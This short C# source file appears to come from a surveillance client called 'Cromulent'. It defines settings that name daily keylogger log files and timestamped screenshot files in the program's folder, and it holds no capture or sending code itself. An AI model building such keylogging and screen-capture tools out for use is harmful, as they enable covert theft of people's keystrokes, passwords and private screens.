using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Cromulent.Client
{
    public class Settings
    {
        private static string Root { get { return Application.StartupPath; } }

        public static string KeyLoggerFileName { get { return Path.Combine(Root, string.Format(@"keys_{0}.txt", DateTime.Now.ToString("yyyyMMdd"))); } }
        public static string ScreenShotFileName { get { return Path.Combine(Root, string.Format(@"screens_{0}.bmp", DateTime.Now.ToString("yyyyMMdd_hh_mm_ss_ff_tt"))); } }
    }
}
